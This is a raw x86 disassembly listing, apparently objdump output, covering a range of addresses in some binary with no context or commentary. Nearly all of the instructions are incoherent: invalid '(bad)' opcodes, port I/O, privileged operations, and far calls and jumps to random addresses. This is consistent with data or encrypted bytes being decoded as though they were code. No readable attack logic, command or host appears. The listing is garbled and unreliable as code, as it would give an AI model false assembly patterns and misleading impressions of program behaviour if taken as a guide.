  41e488:	repz push 0xffffff90
  41e48b:	(bad)
  41e48f:	inc    ecx
  41e490:	out    0xc0,al
  41e492:	mov    al,0xde
  41e494:	pushf  
  41e495:	ror    dl,cl
  41e497:	xlat   BYTE PTR ds:[ebx]
  41e498:	addr16 mov ebx,0x19a113a9
  41e49e:	gs cli 
  41e4a0:	xchg   edx,eax
  41e4a1:	dec    eax
  41e4a2:	enter  0xd736,0x7b
  41e4a6:	sbb    esp,DWORD PTR [edx+0x3d]
  41e4a9:	fisub  DWORD PTR [ebx+0x47]
  41e4ac:	fwait
  41e4ad:	mov    bh,0x85
  41e4af:	leave  
  41e4b0:	mov    ss,eax
  41e4b2:	fs xchg edi,eax
  41e4b4:	pop    eax
  41e4b5:	inc    edi
  41e4b6:	push   ds
  41e4b7:	js     0x41e468
  41e4b9:	mov    ds:0x79ed87a5,eax
  41e4be:	pop    edi
  41e4bf:	cli    
  41e4c0:	mov    ah,0x96
  41e4c2:	inc    eax
  41e4c3:	test   al,0x3
  41e4c5:	push   eax
  41e4c6:	call   FWORD PTR [eax]
  41e4c8:	leave  
  41e4c9:	mov    dh,0x32
  41e4cb:	out    dx,al
  41e4cc:	mov    bh,0x0
  41e4ce:	ret    0x5601
  41e4d1:	cdq    
  41e4d2:	scas   eax,DWORD PTR es:[edi]
  41e4d3:	jl     0x41e54b
  41e4d5:	dec    ecx
  41e4d6:	sbb    bl,BYTE PTR [eax+0x5f827e48]
  41e4dc:	outs   dx,BYTE PTR ds:[esi]
  41e4dd:	push   ecx
  41e4de:	inc    ebp
	...
  41e4eb:	adc    esp,DWORD PTR [edi+eiz*8+0xb]
  41e4ef:	test   DWORD PTR [ebx-0xce58301],0x47044cfc
  41e4f9:	in     eax,dx
  41e4fa:	push   esi
  41e4fb:	adc    DWORD PTR [edx+0xad0001],esp
  41e501:	add    BYTE PTR [eax],al
  41e503:	mov    ds:0xc8e33ea5,eax
  41e508:	jo     0x41e492
  41e50a:	mov    ebx,eax
  41e50c:	jo     0x41e497
  41e50e:	repz mov cl,0x66
  41e511:	jmp    0x41e58d
  41e513:	out    dx,eax
  41e514:	push   ecx
  41e515:	add    ah,BYTE PTR [ebx]
  41e517:	or     esi,DWORD PTR [ecx+0x634f23a5]
  41e51d:	jg     0x41e4f5
  41e51f:	mov    edi,DWORD PTR [ecx]
  41e521:	cmp    DWORD PTR [edx-0x23],0x8
  41e525:	nop
  41e526:	mov    bl,0x36
  41e528:	call   0x857acf1a
  41e52d:	jle    0x41e4b6
  41e52f:	push   es
  41e530:	into   
  41e531:	int    0xa2
  41e533:	aad    0x64
  41e535:	call   DWORD PTR [edi-0x48]
  41e538:	lods   eax,DWORD PTR ds:[esi]
  41e539:	call   0xfe91:0x4c154c43
  41e540:	mov    cl,0x56
  41e542:	pop    ebp
  41e543:	leave  
  41e544:	dec    esi
  41e545:	dec    ecx
  41e546:	sbb    eax,0xfa36d32f
  41e54b:	idiv   BYTE PTR [esi+0x395e7c63]
  41e551:	(bad)  
  41e553:	fsubr  st(2),st
  41e555:	and    BYTE PTR [ebx+0x410f1bc1],bl
  41e55b:	int    0x62
  41e55d:	cmc    
  41e55e:	xchg   ebx,eax
  41e55f:	pusha  
  41e560:	sbb    eax,0xb0a63409
  41e565:	inc    esi
  41e566:	cmp    DWORD PTR [ebp+0x63],esp
  41e569:	mov    ch,0xc1
  41e56b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e56c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e56d:	xchg   ebp,eax
  41e56e:	and    bl,BYTE PTR [edx-0x75]
  41e571:	fidivr DWORD PTR [edx]
  41e573:	mov    al,ds:0x49e66dde
  41e578:	and    cl,ah
  41e57a:	xchg   esi,eax
  41e57b:	imul   edx,DWORD PTR [edx],0xe0da3ab6
  41e581:	sbb    dl,bl
  41e583:	add    al,0x76
  41e585:	stc    
  41e586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e587:	or     eax,esp
  41e589:	and    al,0x2
  41e58b:	sahf   
  41e58c:	jb     0x41e5da
  41e58e:	cmp    BYTE PTR [ebp+0x3b],al
  41e591:	inc    esp
  41e592:	call   0x77bb0c7
  41e597:	jo     0x41e5f0
  41e599:	mov    ch,0xf8
  41e59b:	inc    ecx
  41e59c:	int3   
  41e59d:	and    eax,0xaf191fbb
  41e5a2:	rcr    BYTE PTR [eax*4+0x6fdb0aa3],1
  41e5a9:	ret    
  41e5aa:	fucomi st,st(3)
  41e5ac:	pop    esp
  41e5ad:	js     0x41e62b
  41e5af:	pop    edi
	...
  41e5b8:	add    BYTE PTR [eax],al
  41e5ba:	add    BYTE PTR [edi],ah
  41e5bc:	push   ecx
  41e5bd:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  41e5c7:	sbb    al,0xe1
  41e5c9:	jae    0x41e633
  41e5cb:	mov    esi,0xad0001a2
  41e5d0:	add    BYTE PTR [eax],al
  41e5d2:	add    BYTE PTR [edi+0x7c],bl
  41e5d5:	mov    BYTE PTR [eax-0x458c89c],dh
  41e5db:	push   0xffffffd6
  41e5dd:	sub    dh,BYTE PTR [ecx]
  41e5df:	std    
  41e5e0:	ficom  WORD PTR [edi+ecx*2]
  41e5e3:	nop
  41e5e4:	repz test DWORD PTR [eiz*2+0x35b69165],edi
  41e5ec:	jmp    0x5c6e1e46
  41e5f1:	ds pop esp
  41e5f3:	adc    cl,ch
  41e5f5:	jmp    0x7f4bedcb
  41e5fa:	cmc    
  41e5fb:	sti    
  41e5fc:	adc    DWORD PTR [edi],ebp
  41e5fe:	push   esi
  41e5ff:	mov    dl,0xe6
  41e601:	mov    dh,0xc8
  41e603:	aas    
  41e604:	xor    ecx,edi
  41e606:	inc    esp
  41e607:	loope  0x41e5ca
  41e609:	repnz sbb DWORD PTR [eax+0x6a29320],esp
  41e610:	std    
  41e611:	xor    eax,0xad303cdc
  41e616:	ins    BYTE PTR es:[edi],dx
  41e617:	mov    al,0x56
  41e619:	push   ebx
  41e61a:	xor    BYTE PTR [esi+0x5ff5467b],dh
  41e620:	dec    esp
  41e621:	adc    eax,0xbe02118e
  41e626:	xor    al,0xbb
  41e628:	clc    
  41e629:	push   ebx
  41e62a:	gs cwde 
  41e62c:	pop    edi
  41e62d:	mov    bl,BYTE PTR [ecx]
  41e62f:	mov    edi,0xdac4f7ed
  41e634:	mov    eax,0x97242844
  41e639:	inc    edx
  41e63a:	add    esp,DWORD PTR [ecx+0x1c]
  41e63d:	pop    ecx
  41e63e:	imul   ebp,DWORD PTR [ebp+0xf],0x8ef78794
  41e645:	inc    edi
  41e646:	in     al,0x64
  41e648:	mov    ds:0xea770a1b,eax
  41e64d:	mov    BYTE PTR [ecx-0x1aa0ab46],bl
  41e653:	sti    
  41e654:	push   ds
  41e655:	mov    bh,0x82
  41e657:	and    DWORD PTR [edx-0x5442e3a4],edi
  41e65d:	retf   0xc679
  41e660:	inc    ebp
  41e661:	retf   
  41e662:	pusha  
  41e663:	or     bl,BYTE PTR [esi+0x3a]
  41e666:	mov    bl,0x6d
  41e668:	ins    DWORD PTR es:[edi],dx
  41e669:	xchg   ebp,eax
  41e66a:	imul   edx,DWORD PTR [esi+0x5fa40a8e],0xf7e07c0c
  41e674:	leave  
  41e675:	imul   edx,ebp,0xe98b5a56
  41e67b:	jmp    0x0:0xf9e1c922
	...
  41e68a:	add    BYTE PTR [esi],dh
  41e68c:	add    dl,BYTE PTR [ebp+0xc]
  41e68f:	jne    0x41e6f0
  41e691:	jg     0x41e6cd
  41e693:	clc    
  41e694:	cs aas 
  41e696:	push   0x447e1e66
  41e69b:	push   0xffffff8a
  41e69d:	add    DWORD PTR [eax],eax
  41e69f:	lods   eax,DWORD PTR ds:[esi]
  41e6a0:	add    BYTE PTR [eax],al
  41e6a2:	add    bh,dh
  41e6a4:	jbe    0x41e64d
  41e6a6:	rdpmc  
  41e6a8:	fisttp WORD PTR [eax+0x76]
  41e6ab:	sub    BYTE PTR [esp+ebx*8],dl
  41e6ae:	jnp    0x41e725
  41e6b0:	pop    esi
  41e6b1:	daa    
  41e6b2:	mov    ah,0xbd
  41e6b4:	mov    BYTE PTR [eax+0x19265b2d],cl
  41e6ba:	xchg   ebp,eax
  41e6bb:	mov    edx,0x52bdc52f
  41e6c0:	(bad)  [ebx]
  41e6c2:	mov    edx,DWORD PTR [edx]
  41e6c4:	not    DWORD PTR [edi-0x58]
  41e6c7:	dec    esi
  41e6c8:	jmp    0xd1e24969
  41e6cd:	pop    ds
  41e6ce:	jnp    0x41e744
  41e6d0:	mov    ah,bh
  41e6d2:	sub    DWORD PTR [edi+0x75548e75],ebp
  41e6d8:	xor    DWORD PTR [ebp-0x18],ecx
  41e6db:	jl     0x41e65d
  41e6dd:	sahf   
  41e6de:	cwde   
  41e6df:	sub    edx,DWORD PTR [edi+0x63]
  41e6e2:	jo     0x41e742
  41e6e4:	gs pop esi
  41e6e6:	je     0x41e678
  41e6e8:	cwde   
  41e6e9:	dec    edx
  41e6ea:	sub    bh,BYTE PTR [eax+0x6b]
  41e6ed:	mov    edx,0x82c5429b
  41e6f2:	mov    edi,0x307905e1
  41e6f7:	inc    edi
  41e6f8:	jb     0x41e6d5
  41e6fa:	xor    eax,0xc4e46fb6
  41e6ff:	mov    al,ds:0x317dba0b
  41e704:	push   esp
  41e705:	xor    BYTE PTR [edi+0x7de263e8],dl
  41e70b:	mov    dh,0xc8
  41e70d:	jge    0x41e718
  41e70f:	dec    ecx
  41e710:	dec    edx
  41e711:	push   ebp
  41e712:	popf   
  41e713:	aam    0x1a
  41e715:	es add bh,ch
  41e718:	cdq    
  41e719:	mov    bl,0xd9
  41e71b:	xchg   dl,bl
  41e71d:	sub    eax,0x5404e28b
  41e722:	pop    ecx
  41e723:	jmp    DWORD PTR [edx]
  41e725:	pop    esi
  41e726:	(bad)  
  41e727:	ins    DWORD PTR es:[edi],dx
  41e728:	imul   esp
  41e72a:	sub    BYTE PTR [esi],dh
  41e72c:	dec    ebx
  41e72d:	and    eax,0x1a638fa1
  41e732:	xor    al,0x53
  41e734:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e735:	mov    al,0xf7
  41e737:	pushf  
  41e738:	sbb    ah,BYTE PTR [esi]
  41e73a:	pushf  
  41e73b:	pop    edi
  41e73c:	xchg   si,ax
  41e73e:	xor    BYTE PTR [eax+0x7a],ah
  41e741:	data16 rcl ah,cl
  41e744:	nop
  41e745:	mov    cl,BYTE PTR [eax-0x75]
  41e748:	jbe    0x41e70a
  41e74a:	call   0xd1a9cc8d
  41e74f:	jmp    0x0:0x0
  41e756:	add    BYTE PTR [eax],al
  41e758:	add    BYTE PTR [eax],al
  41e75a:	add    BYTE PTR [eax],cl
  41e75c:	mov    cl,0x72
  41e75e:	cmp    edi,ebx
  41e760:	sti    
  41e761:	dec    ecx
  41e762:	mov    bl,0x94
  41e764:	je     0x41e73d
  41e766:	call   0x8b17:0xe905ad3e
  41e76d:	add    DWORD PTR [eax],eax
  41e76f:	lods   eax,DWORD PTR ds:[esi]
  41e770:	add    BYTE PTR [eax],al
  41e772:	add    dl,al
  41e774:	mov    ch,0x8f
  41e776:	fwait
  41e777:	xor    al,0x60
  41e779:	dec    edx
  41e77a:	dec    eax
  41e77b:	jno    0x41e775
  41e77d:	int    0xf5
  41e77f:	les    ebp,FWORD PTR [ecx+0xb]
  41e782:	(bad)  
  41e783:	add    al,bh
  41e785:	mov    eax,0x7ed8ea9f
  41e78a:	pushf  
  41e78b:	and    ebp,esi
  41e78d:	jle    0x41e792
  41e78f:	iret   
  41e790:	shl    BYTE PTR [edi-0x43],cl
  41e793:	xchg   edx,eax
  41e794:	ins    DWORD PTR es:[edi],dx
  41e795:	and    eax,0xb58dc9ae
  41e79a:	out    dx,eax
  41e79b:	xor    al,BYTE PTR [ebp+0x53]
  41e79e:	mov    eax,ds:0xd87b8613
  41e7a3:	xchg   ebp,eax
  41e7a4:	pushf  
  41e7a5:	sbb    eax,0xae91a53c
  41e7aa:	scas   eax,DWORD PTR es:[edi]
  41e7ab:	xchg   esi,eax
  41e7ac:	add    ebp,DWORD PTR [eax-0x17]
  41e7af:	mov    WORD PTR [edx+eiz*2-0x31553520],gs
  41e7b6:	pushf  
  41e7b7:	daa    
  41e7b8:	add    DWORD PTR [esi],ecx
  41e7ba:	int    0x95
  41e7bc:	inc    ebx
  41e7bd:	hlt    
  41e7be:	aas    
  41e7bf:	iret   
  41e7c0:	loopne 0x41e818
  41e7c2:	popa   
  41e7c3:	xchg   ebx,eax
  41e7c4:	packssdw mm0,mm0
  41e7c7:	xchg   BYTE PTR [ebx],al
  41e7c9:	std    
  41e7ca:	int3   
  41e7cb:	cwde   
  41e7cc:	mul    BYTE PTR [ebx-0x3d]
  41e7cf:	mov    ds,esi
  41e7d1:	repz add al,0x67
  41e7d4:	out    dx,al
  41e7d5:	aaa    
  41e7d6:	inc    esi
  41e7d7:	push   ss
  41e7d8:	test   eax,0x1b5811cc
  41e7dd:	shl    eax,0x13
  41e7e0:	inc    BYTE PTR [edx-0x13]
  41e7e3:	bound  edx,QWORD PTR [esi+0x23cdc2ce]
  41e7e9:	or     eax,DWORD PTR [ecx]
  41e7eb:	mov    ds:0x775b42,eax
  41e7f0:	ins    BYTE PTR es:[edi],dx
  41e7f1:	pop    esp
  41e7f2:	mov    edi,0xbde3e737
  41e7f7:	daa    
  41e7f8:	xchg   BYTE PTR [edi],cl
  41e7fa:	pop    ebp
  41e7fb:	enter  0x7000,0x17
  41e7ff:	jo     0x41e79e
  41e801:	imul   ebx,DWORD PTR [edi-0xb],0x2830ca
  41e808:	mov    eax,gs
  41e80a:	jbe    0x41e885
  41e80c:	xchg   BYTE PTR [ebx],cl
  41e80e:	aam    0xfa
  41e810:	fs hlt 
  41e812:	mov    cl,0x95
  41e814:	fild   WORD PTR [ebx]
  41e816:	mov    edi,0x93b2a8f7
  41e81b:	stos   BYTE PTR es:[edi],al
  41e81c:	or     edi,0x6513
	...
  41e82a:	add    bh,bl
  41e82c:	push   ebx
  41e82d:	mov    dl,0x4f
  41e82f:	mov    esi,0x67d3ffef
  41e834:	xchg   ecx,edi
  41e836:	adc    al,0xa9
  41e838:	imul   ecx,edx,0x18bc4cd
  41e83e:	add    BYTE PTR [ebp+0x16000000],ch
  41e844:	stos   BYTE PTR es:[edi],al
  41e845:	ret    0xfec
  41e848:	(bad)  
  41e849:	in     al,dx
  41e84a:	jle    0x41e806
  41e84c:	cmp    dl,al
  41e84e:	ins    DWORD PTR es:[edi],dx
  41e84f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e850:	jb     0x41e8b6
  41e852:	fs leave 
  41e854:	xor    DWORD PTR [eax+0x1fad1a7c],0xd253bfea
  41e85e:	sub    BYTE PTR [edx],0xb6
  41e861:	push   cs
  41e862:	cdq    
  41e863:	dec    ebx
  41e864:	inc    edx
  41e865:	loopne 0x41e822
  41e867:	ror    DWORD PTR [edx+0x575b751c],0x7a
  41e86e:	sbb    dl,BYTE PTR [edx+ebp*2+0x70]
  41e872:	cdq    
  41e873:	ins    BYTE PTR es:[edi],dx
  41e874:	pop    esi
  41e875:	mov    esi,0x7c7cc966
  41e87a:	enter  0x15ac,0xa5
  41e87e:	mov    WORD PTR [bx+di+0xb],fs
  41e882:	push   eax
  41e883:	inc    esp
  41e884:	mul    DWORD PTR [esi+0x6f7531d]
  41e88a:	and    al,0x73
  41e88c:	xor    eax,0xd5a548e9
  41e891:	ja     0x41e8f9
  41e893:	cmp    ebp,DWORD PTR [ebp-0x55]
  41e896:	js     0x41e8b7
  41e898:	ins    DWORD PTR es:[edi],dx
  41e899:	lds    edx,FWORD PTR [esi]
  41e89b:	mov    al,0x1b
  41e89d:	out    0xb5,al
  41e89f:	mov    bl,dl
  41e8a1:	jmp    0x41e88c
  41e8a3:	xchg   edi,eax
  41e8a4:	inc    esp
  41e8a5:	lea    esi,[edx]
  41e8a7:	imul   edx,ebp,0xffffffca
  41e8aa:	pop    edx
  41e8ab:	shl    DWORD PTR [ebx],0xf3
  41e8ae:	loope  0x41e8d2
  41e8b0:	add    al,bl
  41e8b2:	mov    ds:0x62ac786b,al
  41e8b7:	xchg   DWORD PTR [esi],ebx
  41e8b9:	dec    ebp
  41e8ba:	sbb    eax,0xe7d58822
  41e8bf:	mov    esi,0x3cf5af63
  41e8c4:	mov    esp,0x8b0fea38
  41e8c9:	inc    eax
  41e8ca:	clc    
  41e8cb:	call   0x9e14:0xddc98245
  41e8d2:	hlt    
  41e8d3:	sbb    al,0xa3
  41e8d5:	lea    ecx,[edx]
  41e8d7:	stos   DWORD PTR es:[edi],eax
  41e8d8:	mov    edi,0x9689d5e9
  41e8dd:	ret    
  41e8de:	adc    edi,edx
  41e8e0:	sahf   
  41e8e1:	pop    ds
  41e8e2:	retf   
  41e8e3:	push   ecx
  41e8e4:	push   esp
  41e8e5:	cmp    al,0x25
  41e8e7:	sahf   
  41e8e8:	fbstp  TBYTE PTR [esi]
  41e8ea:	mov    al,ds:0xfd53a875
  41e8ef:	fadd   DWORD PTR [eax]
	...
  41e8f9:	add    BYTE PTR [eax],al
  41e8fb:	xchg   DWORD PTR [ebx+edx*8],ecx
  41e8fe:	fcmovu st,st(3)
  41e900:	fisttp WORD PTR [edi+0x640ccb5d]
  41e906:	push   ss
  41e907:	push   esp
  41e908:	jmp    0x8cb30854
  41e90d:	add    DWORD PTR [eax],eax
  41e90f:	lods   eax,DWORD PTR ds:[esi]
  41e910:	add    BYTE PTR [eax],al
  41e912:	add    BYTE PTR [esi+esi*4+0x7b],cl
  41e916:	or     al,0xef
  41e918:	clc    
  41e919:	xor    al,0x1b
  41e91b:	scas   al,BYTE PTR es:[edi]
  41e91c:	int3   
  41e91d:	inc    eax
  41e91e:	out    0xdf,eax
  41e920:	js     0x41e94a
  41e922:	rcl    bh,0x79
  41e925:	mov    ds:0x2b354874,al
  41e92a:	les    edx,FWORD PTR [esi]
  41e92c:	inc    edi
  41e92d:	lahf   
  41e92e:	arpl   WORD PTR [esi],dx
  41e930:	dec    esi
  41e931:	push   ebp
  41e932:	fdiv   DWORD PTR [ebp+0x74]
  41e935:	push   edx
  41e936:	lock cmp dh,BYTE PTR [eax-0x598f7134]
  41e93d:	arpl   WORD PTR [ecx+ebp*8+0x7f],cx
  41e941:	mov    ds:0x2442bd14,eax
  41e946:	xor    BYTE PTR [ecx],0x70
  41e949:	ret    0x6645
  41e94c:	xor    DWORD PTR [ecx-0x430f0c91],edi
  41e952:	addr16 mov ds:0x2002,al
  41e956:	int3   
  41e957:	add    DWORD PTR [edx-0x61],esp
  41e95a:	sbb    eax,0x4014d63f
  41e95f:	jge    0x41e9a0
  41e961:	ja     0x41e8fa
  41e963:	xlat   BYTE PTR ds:[ebx]
  41e964:	push   es
  41e965:	jl     0x41e8fa
  41e967:	in     al,0xc6
  41e969:	push   esi
  41e96a:	adc    dx,ax
  41e96d:	push   cs
  41e96e:	jnp    0x41e924
  41e970:	jp     0x41e946
  41e972:	stc    
  41e973:	jp     0x41e939
  41e975:	add    bl,BYTE PTR [ecx-0x47]
  41e978:	je     0x41e9c8
  41e97a:	stos   BYTE PTR es:[edi],al
  41e97b:	cld    
  41e97c:	mov    dl,0xd3
  41e97e:	int    0xb4
  41e980:	sub    edi,ebx
  41e982:	fidivr WORD PTR [ebp+0x41]
  41e985:	push   ebx
  41e986:	mov    bl,0x39
  41e988:	lods   eax,DWORD PTR ds:[esi]
  41e989:	sub    eax,0x84f9d739
  41e98e:	inc    ebp
  41e98f:	push   cs
  41e990:	mov    ebp,0x4f2d72f7
  41e995:	ja     0x41ea0e
  41e997:	mov    gs,WORD PTR [eax]
  41e999:	sbb    ecx,ebp
  41e99b:	and    al,0xf1
  41e99d:	adc    al,0x9b
  41e99f:	jb     0x41ea17
  41e9a1:	fstp   TBYTE PTR [edi+0x5120a2a5]
  41e9a7:	lods   al,BYTE PTR ds:[esi]
  41e9a8:	pop    es
  41e9a9:	or     al,BYTE PTR [edx-0x50]
  41e9ac:	popf   
  41e9ad:	test   al,0x22
  41e9af:	cs cmp dh,ch
  41e9b2:	and    DWORD PTR [ebx],ebp
  41e9b4:	enter  0x4476,0xd5
  41e9b8:	pusha  
  41e9b9:	out    0x86,eax
  41e9bb:	mov    DWORD PTR [ebx+0x13],edx
  41e9be:	loop   0x41ea3d
	...
  41e9c8:	add    BYTE PTR [eax],al
  41e9ca:	add    BYTE PTR [edi-0x28db29d],bl
  41e9d0:	jle    0x41e991
  41e9d2:	out    dx,eax
  41e9d3:	sbb    edi,esp
  41e9d5:	mov    BYTE PTR [ebx+eiz*1+0x1e2b9c72],dh
  41e9dc:	lea    eax,[ecx]
  41e9de:	add    BYTE PTR [ebp-0x1a000000],ch
  41e9e4:	shl    cl,cl
  41e9e6:	cmp    BYTE PTR [eax+0x43074b07],cl
  41e9ec:	fsubr  QWORD PTR ss:[edx+0x8]
  41e9f0:	adc    bh,BYTE PTR [eax]
  41e9f2:	dec    BYTE PTR [esi-0x6a700f63]
  41e9f8:	or     bl,BYTE PTR [esi+0x664ae5a5]
  41e9fe:	jae    0x41ea6f
  41ea00:	or     ebp,DWORD PTR [ebx-0x25]
  41ea03:	pop    ecx
  41ea04:	xor    DWORD PTR [edx-0x71],0x40
  41ea08:	push   ebx
  41ea09:	pop    ds
  41ea0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea0b:	shr    BYTE PTR cs:[eax-0x33],1
  41ea0f:	cmp    esp,ebp
  41ea11:	out    0x20,al
  41ea13:	mov    ah,0x3d
  41ea15:	fucom  st(5)
  41ea17:	mov    ah,0xf
  41ea19:	int3   
  41ea1a:	adc    DWORD PTR ds:0x41f8e3e3,0x8e017144
  41ea24:	dec    edx
  41ea25:	xchg   ecx,eax
  41ea26:	in     al,0xed
  41ea28:	push   0x4
  41ea2a:	add    bl,ch
  41ea2c:	fwait
  41ea2d:	aam    0x68
  41ea2f:	stos   BYTE PTR es:[edi],al
  41ea30:	shl    BYTE PTR [edi+0x19cf21e6],cl
  41ea36:	(bad)  
  41ea37:	mov    ds:0x2611ff31,al
  41ea3c:	mov    ah,0xd1
  41ea3e:	enter  0x6043,0xea
  41ea42:	mov    eax,esp
  41ea44:	ret    0x548e
  41ea47:	clc    
  41ea48:	and    edi,0xe4f73f5a
  41ea4e:	pop    ecx
  41ea4f:	pusha  
  41ea50:	out    0xb5,eax
  41ea52:	ret    0xb3fe
  41ea55:	into   
  41ea56:	dec    esi
  41ea57:	adc    al,0xf
  41ea59:	mov    ebx,0xb46b677
  41ea5e:	int3   
  41ea5f:	out    dx,eax
  41ea60:	sahf   
  41ea61:	xchg   edi,eax
  41ea62:	retf   
  41ea63:	pop    ecx
  41ea64:	add    al,0xcd
  41ea66:	push   ecx
  41ea67:	mov    ds:0x8ef4b457,al
  41ea6d:	ror    BYTE PTR [edi],0x7e
  41ea70:	xchg   ebp,eax
  41ea71:	pusha  
  41ea72:	repz pop si
  41ea75:	shl    esi,cl
  41ea77:	out    dx,al
  41ea78:	sub    eax,0xe7b3969e
  41ea7d:	sahf   
  41ea7e:	pop    esi
  41ea7f:	imul   esp,ecx,0x1655cdf8
  41ea85:	jle    0x41ea94
  41ea87:	es xchg edi,eax
  41ea89:	ffreep st(1)
  41ea8b:	in     eax,0xee
  41ea8d:	xor    DWORD PTR [edi],0x7c
	...
  41ea9b:	jo     0x41eac0
  41ea9d:	and    eax,0x7c6f7769
  41eaa2:	cmp    esp,DWORD PTR [eax-0x554311e4]
  41eaa8:	adc    esi,DWORD PTR [edx+0x18dcb49]
  41eaae:	add    BYTE PTR [ebp-0x57000000],ch
  41eab4:	int    0x5e
  41eab6:	jmp    0x94f2:0xbb782be
  41eabd:	rdpmc  
  41eabf:	lods   eax,DWORD PTR ds:[esi]
  41eac0:	add    eax,0xa317ea27
  41eac5:	ret    
  41eac6:	add    eax,0xda1513a5
  41eacb:	or     eax,DWORD PTR [edi]
  41eacd:	mov    WORD PTR [eax+0x2679bd],ss
  41ead3:	inc    edi
  41ead4:	aam    0x8a
  41ead6:	mov    esp,0x8322c60f
  41eadb:	mov    cl,0xf3
  41eadd:	xor    DWORD PTR [ecx+0x19e359dc],ebp
  41eae3:	imul   edi,edi,0x1fc19d74
  41eae9:	gs mov dh,0xbf
  41eaec:	mov    al,0xc
  41eaee:	fcomp  DWORD PTR [edi]
  41eaf0:	test   BYTE PTR [edi],dl
  41eaf2:	sysenter 
  41eaf4:	std    
  41eaf5:	fisttp QWORD PTR [esi+ebx*2-0x49793fa3]
  41eafc:	in     al,0x94
  41eafe:	xor    BYTE PTR [esi-0x58],bh
  41eb01:	cmp    edi,ecx
  41eb03:	jp     0x41eb63
  41eb05:	xor    edx,esp
  41eb07:	ins    DWORD PTR es:[edi],dx
  41eb08:	je     0x41eaf0
  41eb0a:	adc    al,0x2d
  41eb0c:	xchg   ebp,eax
  41eb0d:	icebp  
  41eb0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb0f:	push   esp
  41eb10:	mov    ebp,0x3144ef87
  41eb15:	jno    0x41eb80
  41eb17:	or     al,0x59
  41eb19:	push   ebx
  41eb1a:	out    0x35,al
  41eb1c:	frndint 
  41eb1e:	loope  0x41eb74
  41eb20:	xchg   bh,dh
  41eb22:	xchg   BYTE PTR [esi-0x41],ah
  41eb25:	fs push es
  41eb27:	daa    
  41eb28:	mov    edi,0x37792ebd
  41eb2d:	nop
  41eb2e:	jae    0x41eaba
  41eb30:	lea    ebx,[esi+0x73476bbb]
  41eb36:	lock xor edx,DWORD PTR [eax-0x24]
  41eb3a:	scas   al,BYTE PTR es:[edi]
  41eb3b:	add    ebx,DWORD PTR [esi-0x77]
  41eb3e:	xor    eax,0xc6f1a072
  41eb43:	push   esp
  41eb44:	lock add al,0x90
  41eb47:	lods   eax,DWORD PTR ds:[esi]
  41eb48:	xor    ecx,ebx
  41eb4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb4b:	cli    
  41eb4c:	sub    DWORD PTR [eax+ebp*4-0x4ef68295],ebx
  41eb53:	addr16 push ds
  41eb55:	adc    eax,0xea843a70
  41eb5a:	dec    eax
  41eb5b:	call   0x0:0xb815e649
	...
  41eb6a:	add    BYTE PTR [eax+edx*4-0x32223f23],dl
  41eb71:	popf   
  41eb72:	aam    0x57
  41eb74:	(bad)
  41eb78:	call   0x1:0x8e789a63
  41eb7f:	lods   eax,DWORD PTR ds:[esi]
  41eb80:	add    BYTE PTR [eax],al
  41eb82:	add    BYTE PTR ds:0xe6656ce7,bh
  41eb88:	pop    ebx
  41eb89:	inc    eax
  41eb8a:	adc    BYTE PTR [ebx-0x6309cc9e],cl
  41eb90:	dec    eax
  41eb91:	shl    BYTE PTR [esi+0x7b],1
  41eb94:	lahf   
  41eb95:	mov    ds:0xfea3e0c4,eax
  41eb9a:	push   ecx
  41eb9b:	mov    bl,0xfe
  41eb9d:	sti    
  41eb9e:	mov    gs,WORD PTR [edi+eiz*4+0x78]
  41eba2:	mov    ch,0xb4
  41eba4:	iret   
  41eba5:	iret   
  41eba6:	jae    0x41eb35
  41eba8:	test   DWORD PTR ds:0xa4480931,ecx
  41ebae:	js     0x41eb55
  41ebb0:	pop    edi
  41ebb1:	mov    edx,0xaf6bda34
  41ebb6:	rol    DWORD PTR [ebx],cl
  41ebb8:	out    dx,eax
  41ebb9:	dec    ebp
  41ebba:	outs   dx,BYTE PTR ds:[esi]
  41ebbb:	sar    BYTE PTR [edi-0x49ac5690],1
  41ebc1:	push   edx
  41ebc2:	dec    eax
  41ebc3:	sub    BYTE PTR [eax-0x715957e1],dl
  41ebc9:	ds push ebx
  41ebcb:	mov    eax,DWORD PTR [edx]
  41ebcd:	add    ch,dl
  41ebcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebd0:	jle    0x41ebb1
  41ebd2:	adc    ebp,DWORD PTR [eax-0xf520681]
  41ebd8:	rcl    BYTE PTR [ebx+0x62],0x88
  41ebdc:	jle    0x41ebaa
  41ebde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebdf:	xchg   esi,eax
  41ebe0:	push   ebp
  41ebe1:	jae    0x41ec44
  41ebe3:	mov    dl,0xb9
  41ebe5:	sub    BYTE PTR [ebp-0x1e73d7ec],dl
  41ebeb:	pop    ecx
  41ebec:	mov    ch,0x13
  41ebee:	sub    ah,BYTE PTR [edx]
  41ebf0:	ins    BYTE PTR es:[edi],dx
  41ebf1:	push   edi
  41ebf2:	das    
  41ebf3:	les    ecx,FWORD PTR [edx]
  41ebf5:	xor    al,0xad
  41ebf7:	outs   dx,DWORD PTR ds:[esi]
  41ebf8:	mov    eax,0x3ce197cc
  41ebfd:	loop   0x41ebae
  41ebff:	xor    ah,BYTE PTR [ebx]
  41ec01:	lock in eax,0xac
  41ec04:	jg     0x41ec1c
  41ec06:	mov    ds:0xb8613a59,eax
  41ec0b:	das    
  41ec0c:	jnp    0x41ec3c
  41ec0e:	xchg   ecx,eax
  41ec0f:	(bad)  
  41ec10:	repz xchg edx,eax
  41ec12:	mov    edx,0xb6707890
  41ec17:	dec    eax
  41ec18:	ins    DWORD PTR es:[edi],dx
  41ec19:	jl     0x41ec58
  41ec1b:	xchg   BYTE PTR [edi-0x7e7064fc],bl
  41ec21:	mov    ch,0x5c
  41ec23:	pop    ebx
  41ec24:	stos   DWORD PTR es:[edi],eax
  41ec25:	push   0xffffffd4
  41ec27:	retf   0xf702
  41ec2a:	mov    BYTE PTR [edx-0x11],ah
  41ec2d:	scas   al,BYTE PTR es:[edi]
  41ec2e:	or     al,0xb
	...
